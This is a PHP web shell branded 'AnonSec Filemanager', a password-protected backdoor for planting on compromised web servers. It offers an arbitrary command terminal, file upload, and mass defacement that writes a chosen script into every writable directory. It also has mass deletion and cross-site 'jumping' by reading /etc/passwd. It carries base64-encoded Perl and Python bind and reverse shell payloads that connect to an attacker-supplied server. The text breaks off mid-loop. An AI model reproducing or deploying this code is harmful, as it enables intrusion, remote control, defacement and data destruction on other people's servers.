<?php
/* want to recode? can. and don't forget to credit the author :) */
set_time_limit(0);
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
session_start();
date_default_timezone_set("Asia/Jakarta");
$nana = array_merge($_POST, $_GET);
$pwd = "iq"; // password
if(empty($_SESSION['login'])) {
?>
<html>
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
		<title><?=$_SERVER['HTTP_HOST'];?> login filemanager V.0.1</title>
		<link rel="stylesheet" href="//unknownsec.ftp.sh/main/style-fm.css">
		<script src="//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js"></script>
	</head>
<body class="bg-secondary text-light">
<div class="container-fluid">
	<div class="py-3" id="main">
		<div class="box shadow bg-dark p-4 rounded-3">
			<form method="post">
				<i class="bi bi-display"></i>&nbsp;Login Filemanager V.0.1</u>
<?php
if($nana['pwd']) {
	if($nana['pwd'] == $pwd) {
		$_SESSION['login'] = "login";
echo '<strong>Login</strong> ok!  '.alt_ok().'<a class="btn-close" href="'.$_SERVER['PHP_SELF'].'"></a></div>';
		} else { 
echo '<strong>Login</strong> fail! '.alt_fail().'</div>';
	}
}
?>
				<div class="input-group mb-3">
				<div class="input-group-text"><i class="bi bi-terminal"></i></div>
					<input class="form-control form-control-sm" type="password" name="pwd" placeholder="Password" required="required">
				</div>
			</form>
		<div class="text-secondary">&copy; <?=date("Y");?> UnknownSec</div>
		</div>
	</div>
</div>
</body>
</html>
<?php
exit();
}
// logout
if(isset($nana["left"])) {
	session_start();
	session_destroy();
	echo '<script>window.location="'.$_SERVER['PHP_SELF'].'";</script>';
}
// download file
if(isset($nana['opn']) && ($nana['opn'] != '') && ($nana['action'] == 'download')){
	@ob_clean();
	$file = $nana['opn'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<rd>".$perm."</rd>";
	} else {
		return "<cmd>".$perm."</cmd>";
	}
}
function s(){
	echo '<style>table{display:none;}</style><br>';
}
function alt_ok(){
	echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function alt_fail(){
	echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function op($d, $e) {
	$fp = fopen($d, "w");
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $e);
	curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_FILE, $fp);
	return curl_exec($ch);
	curl_close($ch);
	fclose($fp);
	ob_flush();
	flush();
}
function sz($byt){
	$typ = array('B', 'KB', 'MB', 'GB', 'TB');
	for($i = 0; $byt >= 1024 && $i < (count($typ) -1 ); $byt /= 1024, $i++ );
	return(round($byt,2)." ".$typ[$i]);
}
function ia() {
	$ia = '';
if (getenv('HTTP_CLIENT_IP'))
	$ia = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ia = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ia = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ia = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ia = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ia = getenv('REMOTE_ADDR');
else
	$ia = 'Unknown IP.';
return $ia;
}
function exe($cmd) {
if(function_exists('system')) {
	@ob_start();
	@system($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif(function_exists('exec')) {
	@exec($cmd,$results);
	$buff = "";
foreach($results as $result) {
	$buff .= $result;
	} return $buff;
} elseif(function_exists('passthru')) {
	@ob_start();
	@passthru($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif(function_exists('shell_exec')) {
	$buff = @shell_exec($cmd);
	return $buff;
	}
}
function p($file){
$p = fileperms($file);
if (($p & 0xC000) == 0xC000) {
$i = 's';
} elseif (($p & 0xA000) == 0xA000) {
$i = 'l';
} elseif (($p & 0x8000) == 0x8000) {
$i = '-';
} elseif (($p & 0x6000) == 0x6000) {
$i = 'b';
} elseif (($p & 0x4000) == 0x4000) {
$i = 'd';
} elseif (($p & 0x2000) == 0x2000) {
$i = 'c';
} elseif (($p & 0x1000) == 0x1000) {
$i = 'p';
} else {
$i = 'u';
	}
$i .= (($p & 0x0100) ? 'r' : '-');
$i .= (($p & 0x0080) ? 'w' : '-');
$i .= (($p & 0x0040) ?
(($p & 0x0800) ? 's' : 'x' ) :
(($p & 0x0800) ? 'S' : '-'));
$i .= (($p & 0x0020) ? 'r' : '-');
$i .= (($p & 0x0010) ? 'w' : '-');
$i .= (($p & 0x0008) ?
(($p & 0x0400) ? 's' : 'x' ) :
(($p & 0x0400) ? 'S' : '-'));
$i .= (($p & 0x0004) ? 'r' : '-');
$i .= (($p & 0x0002) ? 'w' : '-');
$i .= (($p & 0x0001) ?
(($p & 0x0200) ? 't' : 'x' ) :
(($p & 0x0200) ? 'T' : '-'));
return $i;
}
if(isset($nana['path'])){
	$path = $nana['path'];
	chdir($path);
}else{
	$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
if(isset($nana['dir'])) {
	$dir = $nana['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
echo "
<html>
	<head>
		<meta charset='UTF-8'>
		<meta name='author' content='UnknownSec'>
		<meta name='viewport' content='widht=device-widht, initial-scale=1.0'>
		<link rel='stylesheet' href='//unknownsec.ftp.sh/main/@css_fm.css'>
		<link rel='stylesheet' href='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/themes/prism-okaidia.css'>
		<title>".$_SERVER["HTTP_HOST"]." File Manager</title>
		<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
		<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
		<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
	</head>
<script type='text/javascript'>baseUrl = window.location.href.split('?')[0]; window.history.pushState('name', '?', baseUrl);</script>
<script type='text/javascript'>
function c(x) {
	window.location = x
}
</script>
<body class='bg-secondary text-light'>
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<h4>AnonSec Filemanager</h4>";
			if(isset($nana['path'])){
				$path = $nana['path'];
				chdir($path);
			}else{
				$path = getcwd();
			}
				$path = str_replace('\\','/',$path);
				$paths = explode('/',$path);
			foreach($paths as $id=>$pat){
			if($pat == '' && $id == 0){
				$a = true;
					echo "<i class='bi bi-hdd-rack'></i>:<a class='text-decoration-none text-light' onclick='c(\"?path=/\")'>/</a>";
				continue;
			}
	if($pat == '') continue;
		echo "<a class='text-decoration-none' onclick='c(\"?path=";
		for($i=0;$i<=$id;$i++){
		echo "$paths[$i]";
	if($i != $id) echo "/";
	}
echo "\")'>".$pat."</a>/";
	}
	$scand = scandir($path);
	echo "&nbsp;[ ".w($path, p($path))." ]";
echo "
<div class='center'>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"".$_SERVER['PHP_SELF']."\")'><i class='bi bi-house'></i> Home</a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&id=upload\")'><i class='bi bi-upload'></i> Upload</a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&id=deface\")'><i class='bi bi-exclamation-diamond'></i> Mass deface</a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&id=delete\")'><i class='bi bi-trash'></i> Mass delete</a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&id=cmd\")'><i class='bi bi-terminal'></i> Terminal</a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&id=jumping\")'><i class='bi bi-exclamation-triangle'></i> Jumping</a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&id=network\")'><i class='bi bi-hdd-network'></i> Network</a>
	<br>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&id=zip\")'><i class='bi bi-file-earmark-zip'></i> Zip & Unzip</a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&id=info\")'><i class='bi bi-info-circle'></i> Info server</a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&id=about\")'><i class='bi bi-info'></i> About</a></h5>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?left\")'><i class='bi bi-box-arrow-in-left'></i> Logout</a>
</div>";
// tools filemanager
if(isset($nana['dir'])) {
	$dir = $nana['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);	
for($i = 0; $i <= $c_dir; $i++) {
	$scdir[$i];
	if($i != $c_dir) {
}
// mass deface #indoxploit
if($nana['id'] == 'deface'){
	function mass_kabeh($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$▚ = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($▚, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($▚, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						echo "<pre>[<cmd>success</cmd>] $▚</pre>";
						file_put_contents($▚, $isi_script);
						$▟ = mass_kabeh($dirc,$namafile,$isi_script);
					}
				}
			}
		}
	}
}
function mass_biasa($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$▚ = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($▚, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($▚, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						echo "<pre>[<cmd>success</cmd>] $dirb/$namafile</pre>";
						file_put_contents($▚, $isi_script);
					}
				}
			}
		}
	}
}
if($nana['start']) {
	if($nana['tipe'] == 'massal') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
	mass_kabeh($nana['d_dir'], $nana['d_file'], $nana['script']);
		echo "</div>";
	} elseif($nana['tipe'] == 'biasa') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
	mass_biasa($nana['d_dir'], $nana['d_file'], $nana['script']);
		echo "</div>";
	}
} else {
s();
echo "
<div class='card text-dark'>
	<div class='card-header'>
<form action='?dir=$path&id=deface' method='POST'>
	Tipe:<br>
<div class='custom-control custom-switch'>
	<input class='custom-control-input' type='checkbox' id='customSwitch' name='tipe' value='biasa'>
	<label class='custom-control-label' for='customSwitch'>Biasa</label>
</div>
<div class='custom-control custom-switch'>
	<input class='custom-control-input' type='checkbox' id='customSwitch1' name='tipe' value='massal'>
	<label class='custom-control-label' for='customSwitch1'>Massal</label>
</div>
	<i class='bi bi-folder'></i> Directory:
	<input class='form-control btn-sm' type='text' name='d_dir' value='$dir' height='10'>
	<i class='bi bi-file-earmark'></i> File name:
	<input class='form-control btn-sm' type='text' name='d_file' placeholder='name file' height='10'>
	<i class='bi bi-file-earmark'></i> Your script:
	<textarea class='form-control btn-sm' rows='10' name='script' placeholder='your secript here'></textarea>
	<input class='btn btn-dark btn-sm btn-block' type='submit' name='start' value='submit' >
</form>
</div>
</div>
<br>";
	}
}
// info
if($nana['id'] == 'info'){
$sql = (function_exists('mysql_connect')) ? "<cmd>ON</cmd>" : "<rd>OFF</rd>";
$curl = (function_exists('curl_version')) ? "<cmd>ON</cmd>" : "<rd>OFF</rd>";
$wget = (exe('wget --help')) ? "<cmd>ON</cmd>" : "<rd>OFF</rd>";
$pl = (exe('perl --help')) ? "<cmd>ON</cmd>" : "<rd>OFF</rd>";
$py = (exe('python --help')) ? "<cmd>ON</cmd>" : "<rd>OFF</rd>";
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
	$disfc = "<cmd>NONE</cmd>";
} else {
	$disfc = "<rd>$disfunc</rd>";
}
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<cmd>OFF</cmd>";
s();
echo "
<div class='card text-dark'>
	<div class='card-header'>
Uname: <cmd>".php_uname()."</cmd><br>
Software: <cmd>".$_SERVER["SERVER_SOFTWARE"]."</cmd><br>
PHP version: <cmd>".PHP_VERSION."</cmd> <a class='text-decoration-none' onclick='c(\"?dir=$path&id=phpinfo\")'>[ PHPINFO ]</a> PHP os: <cmd>".PHP_OS."</cmd><br>
Server Ip: <cmd>".gethostbyname($_SERVER['HTTP_HOST'])."</cmd><br>
Your Ip: <cmd>".ia()."</cmd><br>
User: <cmd>$user</cmd> ($uid) | Group: <cmd>$group</cmd> ($gid)<br>
Safe Mode: $sm<br>
MySQL: $sql | Perl: $pl | Python: $py | WGET: $wget | CURL: $curl<br>
Disable Function:<br><pre>$disfc</pre>
	</div>
</div>
<br/>";
}
// phpinfo 
if($nana['id'] == 'phpinfo'){
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<pre class='php_info'>".substr($buff,$awal,$akhir-$awal)."</pre>";
	exit;
}
// about
if($nana['id'] == 'about'){
s();
echo "
<div class='card text-dark'>
	<div class='card-header'>
		<img class='img-thumbnail rounded mx-auto d-block' alt='AnonSec Team' src='//unknownsec.ftp.sh/AnonSec.jpg' width='150px'>
		Thank bro, for using my shell, if there is an error, please contact the email below.<br />Greetz : <u>{ AnonSec Team } - And You</u><br/>My email: <a class='text-decoration-none' href='mailto:unknownsec1337@gmail.com'>unknownsec1337@gmail.com</a>
	</div>
</div>
<br/>";
}
// network #IndoSec
if($nana['id'] == 'network'){
s();
echo "
<div class='card text-dark'>
	<div class='card-header'>
		<form action='?dir=$path&id=network' method='post'>
			<u>Bind port to /bin/sh [Perl]</u><br>
			<u>Port :</u>
		<div class='input-group'>
			<input class='form-control btn-sm' type='text' name='port' placeholder='6969'>
			<input class='btn btn-dark btn-sm' type='submit' name='bpl' value='submit'>
		</div>
	<h5>Back-Connect</h5>
	<u>Server :</u>
		<input class='form-control btn-sm' type='text' name='server' placeholder='". $_SERVER['REMOTE_ADDR'] ."'>
	<u>Port :</u>
	<div class='input-group'>
		<input class='form-control btn-sm' type='text' name='port' placeholder='6969'>
		<select class='form-control btn-sm' name='bc'>
			<option value='perl'>perl</option>
			<option value='python'>python</option>
		</select>
	</div>
<input class='btn btn-dark btn-sm btn-block' type='submit' value='submit'>
</form>";
if($_POST['bpl']){
	$bp = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
	$brt = @fopen('bp.pl','w');
	fwrite($brt,$bp);
	$out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
	sleep(1);
	echo "<pre>$out\n".exe("ps aux | grep bp.pl")."</pre>";
	unlink("bp.pl");
}
if($_POST['bc'] == 'perl'){
	$bc = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
	$plbc = @fopen('bc.pl','w');
	fwrite($plbc,$bc);
	$out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
	sleep(1);
	echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
	unlink("bc.pl");
}
if($_POST['bc'] == 'python'){
	$bc_py = base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
	$pbc_py = @fopen('bcpy.py','w');
	fwrite($pbc_py,$bc_py);
	$out_py = exe("python bcpy.py ".$_POST['server']." ".$_POST['port']);
	sleep(1);
	echo "<pre>$out_py\n".exe("ps aux | grep bcpy.py")."</pre>";
	unlink("bcpy.py");
	}
	echo "</div>
	</div>
<br/>";
}
// phpinfo 
if($nana['id'] == 'phpinfo'){
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<pre class='php_info'>".substr($buff,$awal,$akhir-$awal)."</pre>";
	exit;
}
// cmd
if($nana['id'] == 'cmd') {
s();
if($nana['ekseCMD']) {
$cmd = $nana['ekseCMD'];
}
echo "
<div class='card text-dark'>
	<div class='card-header'>
		<div class='container-fluid language-javascript'>
			<pre style='font-size:10px;'><cmd>~</cmd>$&nbsp;<rd>$cmd</rd><br><code>"; system($nana['ekseCMD'].' 2>&1'); echo "</code></pre>
		</div>
		<form action='?dir=$path&id=cmd' method='POST'>
			<div class='input-group'>
				<div class='input-group-text'><i class='bi bi-terminal'></i></div><input class='form-control form-control-sm' type='text' name='ekseCMD' value='$cmd'>
			</div>
		</form>
	</div>
</div>
<br>";
// upload
} if($nana['id'] == 'upload'){
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$dir.'/'.$_FILES['file']['name'])){
echo '<strong>Upload</strong> ok! '.alt_ok().'</div>';
}else{
echo '<strong>Upload</strong> fail! '.alt_fail().'</div>';
}
	}
s();
echo "
<form action='?dir=$path&id=upload' method='POST' enctype='multipart/form-data'>
	<div class='input-group mb-3'>
		<input class='form-control form-control-sm' type='file' name='file'>
		<button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
	</div>
</form>";
}
// mass delete #indoxploit
if($nana['id'] == 'delete'){
function hapus_massal($dir,$namafile) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$▚ = $dirc.'/'.$namafile;
			if($dirb === '.') {
				if(file_exists("$dir/$namafile")) {
					unlink("$dir/$namafile");
				}
			} elseif($dirb === '..') {
				if(file_exists("".dirname($dir)."/$namafile")) {
					unlink("".dirname($dir)."/$namafile");
				}
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						if(file_exists($▚)) {
							echo "<pre>[<cmd>deleted</cmd>] $▚</pre>";
							unlink($▚);
							$▟ = hapus_massal($dirc,$namafile);
						}
					}
				}
			}
		}
	}
} if($nana['start']) {
echo "<div style='margin: 5px auto; padding: 5px'>";
	hapus_massal($nana['d_dir'], $nana['d_file']);
echo "</div>";
} else {
s();
echo "
<div class='card text-dark'>
	<div class='card-header'>
		<form action='?dir=$path&id=delete' method='POST'>
		<i class='bi bi-folder'></i> Directory:
			<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
		<i class='bi bi-file-earmark'></i> File name:
		<div class='input-group mb-3'>
			<input class='form-control btn-sm' type='text' name='d_file' placeholder='name file'>
			<input class='btn btn-dark btn-sm' type='submit' name='start' value='submit'>
		</div>
		</form>
	</div>
</div><br>";
		}
	}
}
//zip & unzip indosec
if($nana['id'] == 'zip'){
$exzip = basename($dir).'.zip';
function Zip($source, $destination){
	if (extension_loaded('zip') === true){
		if (file_exists($source) === true){
			$zip = new ZipArchive();
			if ($zip->open($destination, ZIPARCHIVE::CREATE) === true){
				$source = realpath($source);
				if (is_dir($source) === true){
					$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
					foreach ($files as $file){
						$file = realpath($file);
						if (is_dir($file) === true){
							// $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
						}elseif(is_file($file) === true){
							$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
						}
					}
				}elseif(is_file($source) === true){
					$zip->addFromString(basename($source), file_get_contents($source));
				}
			}
			return @$zip->close();
		}
	}
	return false;
}
//Extract/Unzip
function Zip_Extrack($zip_files, $to_dir){
	$zip = new ZipArchive();
	$res = $zip->open($zip_files);
	if ($res === TRUE){
		$name = basename($zip_files, ".zip")."_unzip";
		@mkdir($name);
		@$zip->extractTo($to_dir."/".$name);  
		return @$zip->close();
	}else{
		return false;
	}
}
s();
echo "
<div class='card text-dark'>
	<div class='card-header'>
	Zip Menu
	<form action='?dir=$path&id=zip' enctype='multipart/form-data' method='POST'>
		<div class='input-group mb-3'>
			<input class='form-control form-control-sm' type='file' name='zip_file'>
			<input class='btn btn-dark btn-sm' type='submit' name='upnun' value='Submit'>
		</div>
	</form>";
	if($nana["upnun"]){
		$filename = $_FILES["zip_file"]["name"];
		$tmp = $_FILES["zip_file"]["tmp_name"];
		if(move_uploaded_file($tmp, "$dir/$filename")){
			echo Zip_Extrack($filename, $dir);
			unlink($filename);
echo '<strong>Ekstrak zip</strong> ok! '.alt_ok().'</div>';
		}else{
echo '<strong>Ekstrak zip</strong> fail! '.alt_fail().'</div>';
		}
	}
echo "
Zip backup
<form action='?dir=$path&id=zip' method='POST'>
	<label>location:</label>
	<div class='input-group mb-3'>
		<input class='form-control form-control-sm' type='text' name='folder' value='$dir'>
		<input class='btn btn-dark btn-sm' type='submit' name='backup' value='Submit'>
	</div>
</form>";
	if($nana['backup']){
		$fol = $nana['folder'];
		if(Zip($fol, $nana["folder"].'/'.$exzip)){
echo '<strong>Created Zip</strong> ok! '.alt_ok().'</div>';;
		}else{
echo '<strong>Created Zip</strong> fail! '.alt_ok().'</div>';
		}
	}
echo "
Unzip manual
	<form action='?dir=$path&id=zip' method='POST'>
		<label>location:</label>
			<div class='input-group mb-3'>
			<input class='form-control form-control-sm' type='text' name='file_zip' value='$dir/$exzip'>
			<input class='btn btn-dark btn-sm' type='submit' name='extrak' value='Submit'>
		</div>
	</form>
	</div>
</div>
<br/>";
	if($nana['extrak']){
		$zip = $nana["file_zip"];
		if (Zip_Extrack($zip, $dir)){
echo '<strong>Ekstrak zip</strong> ok! '.alt_ok().'</div>';
		}else{
echo '<strong>Ekstrak zip</strong> fail! '.alt_fail().'</div>';
		}
	}
}
// jumping #indoxploit
if($nana['id'] == 'jumping') {
s();
	$i = 0;
echo "
<div class='card text-dark'>
	<div class='card-header'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $nana['url']);
		if(isset($nana['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<cmd>R</cmd>] <a class='text-decoration-none' onclick='c(\"?dir=$url_user\")'>$url_user</a>";
							if(is_writable($url_user)) {
								$jrw = "[<cmd>RW</cmd>] <a class='text-decoration-none' onclick='c(\"?dir=$url_user\")'>$url_user</a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Totally available $i from ip ".gethostbyname($_SERVER['HTTP_HOST']);
		}
		echo "</pre>";
} else {
echo "
<div class='text-center'>
	<form action='?dir=$path&id=jumping' method='POST'>
	List Domains:<br>
		<textarea class='form-control btn-sm' rows='10' name='url'>";
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
				while($getss = fgets($fp)) {
				echo $getss;
				}
		echo  '</textarea><br>
		<input class="btn btn-outline-light btn-sm btn-block" type="submit" name="jump" value="Jumping">
	</form>
</div>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $nana['url']);
		if(isset($nana['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<cmd>R</cmd>] <a class='text-decoration-none' onclick='c(\"?dir=$web_vh\")'>$web_vh</a>";
						if(is_writable($web_vh)) {
							$jrw = "[<cmd>RW</cmd>] <a class='text-decoration-none' onclick='c(\"?dir=$web_vh\")'>$web_vh</a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Totally available $i from ip ".gethostbyname($_SERVER['HTTP_HOST']);
		}
	echo "</pre>";
} else {
echo "
<div class='text-center'>
	<form action='?dir=$path&id=jumping' method='POST'>
	List Domains: <br>
		<textarea class='form-control btn-sm' rows='10' name='url'>";
			bing("ip:".gethostbyname($_SERVER['HTTP_HOST'])."");
		echo  '</textarea><br>
		<input class="btn btn-outline-light btn-sm btn-block" type="submit" name="jump" value="Jumping">
	</form>
</div>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or print("<rd>Can't read /etc/passwd</rd>");
		while($passwd = fgets($etc)) {
